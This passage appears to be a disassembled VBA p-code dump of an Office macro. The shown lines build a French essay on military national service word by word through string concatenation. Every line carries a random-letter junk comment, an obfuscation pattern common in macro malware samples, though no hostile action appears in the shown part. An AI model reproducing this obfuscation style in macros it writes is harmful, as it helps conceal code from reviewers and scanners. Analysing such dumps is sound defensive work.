' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "place"
' 	Add 
' 	St e5 
' 	BoS 0x0000 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "aux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "corvées"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "inutiles"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "ennui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "connu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	St d2 
' 	QuoteRem 0x0050 0x0008 " twdkmfs"
' Line #165:
' 	LineCont 0x000C 11 00 00 00 17 00 00 00 1E 00 00 00
' 	Ld d2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "National."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "Est-il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "possible"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "rester"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "loin"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	St d2 
' 	QuoteRem 0x0055 0x000D " axlcgnuomimn"
' Line #166:
' 	LineCont 0x0004 47 00 00 00
' 	Ld a4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "personne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "avec"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "on"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "vie,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ses"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "relations,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	St a4 
' 	QuoteRem 0x0020 0x0005 " povp"
' Line #167:
' 	LineCont 0x000C 0E 00 00 00 1E 00 00 00 24 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "ses"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "amis,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "pendant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "puis"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "reprendre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "comme"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "si"
' 	Add 
' 	St a4 
' 	QuoteRem 0x0061 0x0005 " zmkx"
' Line #168:
' 	LineCont 0x0010 2C 00 00 00 32 00 00 00 4C 00 00 00 6E 00 00 00
' 	Ld a4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "rien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "était"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "passé"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "?"
' 	Add 
' 	St a4 
' 	BoS 0x0000 
' 	LitStr 0x0008 "Certains"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "diront"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "National"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "fait"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "partie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "devoir"
' 	Add 
' 	St a3 
' 	QuoteRem 0x000B 0x0005 " kqcy"
' Line #169:
' 	LineCont 0x0004 19 00 00 00
' 	Ld a3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "citoyen."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "Mais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "servir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pays"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "c"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "abord"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "payer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a3 
' 	QuoteRem 0x009C 0x0009 " rqblzfcc"
' Line #170:
' 	LineCont 0x0004 2F 00 00 00
' 	Ld a3 
' 	LitStr 0x0003 "ses"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "impôts,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "participer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "aux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "frais"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "sécurité"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "sociale,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	St a3 
' 	QuoteRem 0x0040 0x000C " ikqvdciphiv"
' Line #171:
' 	Ld a3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "allocations"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "chômage,"
' 	Add 
' 	St a3 
' 	QuoteRem 0x0039 0x0010 " tuagskvbfljuzpx"
' Line #172:
' 	LineCont 0x0008 07 00 00 00 30 00 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "retraites,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "etc."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "Ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "personnes"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	St a2 
' 	QuoteRem 0x0044 0x000F " wwnipzphhdqqyj"
' Line #173:
' 	LineCont 0x000C 08 00 00 00 12 00 00 00 1E 00 00 00
' 	Ld a2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "travaillent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "payent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tout"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "cela,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "actuels"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "sursitaires"
' 	Add 
' 	St a2 
' 	QuoteRem 0x006E 0x000E " icfkjkifskpbv"
' Line #174:
' 	LineCont 0x0014 26 00 00 00 2B 00 00 00 59 00 00 00 6F 00 00 00 7D 00 00 00
' 	Ld a2 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "font"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "partie."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Ils"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "utiles"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a2 
' 	BoS 0x0000 
' 	LitStr 0x0001 "à"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "nation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "cotisants"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tant"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "appelés"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c2 
' 	QuoteRem 0x0042 0x0009 " wmtfqsmt"
' Line #175:
' 	Ld c2 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "contingent."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c2 
' 	QuoteRem 0x003D 0x000D " dctcltmfmtjg"
' Line #176:
' 	LineCont 0x000C 01 00 00 00 0F 00 00 00 7C 00 00 00
' 	LitStr 0x0002 "Le"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "national"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "prétends"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "aujourd"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "hui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "que"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "reprends"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "son"
' 	Add 
' 	St d1 
' 	BoS 0x0000 
' 	Ld d1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "cour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "normalement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "après"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "milieu"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d1 
' 	QuoteRem 0x003C 0x000E " lzegkrpuywsol"
' Line #177:
' 	LineCont 0x0010 21 00 00 00 22 00 00 00 75 00 00 00 A6 00 00 00
' 	Ld d1 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "Travail."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "C"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "sûr"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "véritable"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "utopisme"
' 	Add 
' 	St d1 
' 	BoS 0x0000 
' 	Ld d1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "le"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d1 
' 	BoS 0x0000 
' 	LitStr 0x0005 "bilan"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "se"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "résume"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "pas"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "perte"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "mois"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c3 
' 	QuoteRem 0x002C 0x0010 " yuezpvjqizfoiqf"
' Line #178:
' 	LineCont 0x0010 2E 00 00 00 50 00 00 00 5D 00 00 00 94 00 00 00
' 	Ld c3 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "temps:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "C"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "est"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "une"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "véritable"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "catastrophe"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "situation"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "financière,"
' 	Add 
' 	St c3 
' 	BoS 0x0000 
' 	Ld c3 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "matérielle"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "morale"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "individu,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "aura"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "des"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "répercutions"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c3 
' 	BoS 0x0000 
' 	Ld c3 
' 	LitStr 0x000C "regrettables"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "durables."
' 	Add 
' 	St c3 
' 	QuoteRem 0x005C 0x0010 " rthdhhunuhrqizr"
' Line #179:
' 	LineCont 0x0010 04 00 00 00 0B 00 00 00 19 00 00 00 7E 00 00 00
' 	LitStr 0x0003 "Ils"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "environ"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "250"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "000"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "jeunes"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "citoyens,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "sursitaires,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "devoir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' 	BoS 0x0000 
' 	Ld c1 
' 	LitStr 0x0009 "effectuer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "notre"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "militaire."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "250"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "000"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
